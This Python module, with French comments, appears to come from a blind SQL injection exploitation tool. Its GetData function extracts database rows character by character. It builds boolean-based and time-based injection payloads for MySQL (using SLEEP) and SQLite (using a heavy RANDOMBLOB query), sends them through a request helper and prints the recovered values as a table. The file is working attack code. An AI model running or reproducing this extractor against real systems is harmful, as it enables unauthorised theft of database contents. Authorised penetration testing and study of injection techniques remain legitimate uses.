#coding:utf-8
from prettytable import PrettyTable
from lib.req import *
def GetData(setting, rows):

	# Récupération des informations lier à la requête HTTP
	dbms = setting['dbms']
	sqli_type = setting['sqli_type']
	escape = setting['escape']
	comment = setting['comment']
	operator = setting['operator']
	charset = setting['charset']
	column = setting['column']
	table = setting['table']

	dump = PrettyTable()
	dump.field_names = ['id', column]

	NumRows = rows
	nextchar = 1
	nextline = int(setting['startline'])

	if dbms == 'SQLite':
		nextline += 1
		p_time = 9
	else:
		p_time = setting['p_time']


	valid = ''
	i = 0
	x = 0
	while x<NumRows:# Tant que le nombres d'élément trouver dans la colonne n'est pas trouvée
		while i<len(charset):# Tant que un caractère n'est pas trouvée
			for c in charset:
				c = ord(str(c))# Transformation d'un caractère en ASCII

				# Injection des éléments dans le payload
				if dbms == 'MySQL':

					if sqli_type == 'BSQLI':

						payload = '{} {} ASCII(substr((SELECT {} FROM {} LIMIT {},1),{},1))={}{}'.format(escape, operator, column, table, nextline, nextchar, c, comment)

					else:

						payload = '{} {} (SELECT SLEEP({}) WHERE ASCII(substr((SELECT {} FROM {} LIMIT {},1), {},1))={}){}'.format(escape, operator, p_time, column, table, nextline, nextchar, c, comment )

				elif dbms == 'SQLite':

					if sqli_type == 'BSQLI':

						payload = '{} {} (SELECT substr({}, {},1) FROM {}) = CHAR({}) LIMIT {} {}'.format(escape, operator, column, nextchar, table, c, nextline, comment)

					else:

						payload = '{} {} (select 1=LIKE(1,UPPER(HEX(RANDOMBLOB({}00000000/2)))) WHERE (SELECT substr({},{},1) from {}) = CHAR({}) LIMIT {}) {}'.format(escape, operator, p_time, column, nextchar, table, c, nextline, comment )

				if Fuzz(setting, payload):# Si c'est Vulnérable
					i = 0# On continue la boucles
					nextchar += 1# On met +1 pour passer au caractère suivant
					valid += chr(int(c))# On decode le bon caractère et on le stock
					#print(valid)

				i +=1

		print('['+Fore.YELLOW+'+'+Fore.RESET+']['+Fore.BLUE+str(nextline)+Fore.RESET+'] retrieved : ' + valid)
		dump.add_row([nextline, valid])
		nextline +=1# On passe à ligne suivante pour LIMIT 
		x +=1# Un tours de boucles pour dire qu'on na trouvée une données
		i = 0# On met i à zero pour faire un comme back dans la boucles
		valid = ''# On reset 
		nextchar = 1# On reset le caractère à cherche
	print('\n')
	print(dump)
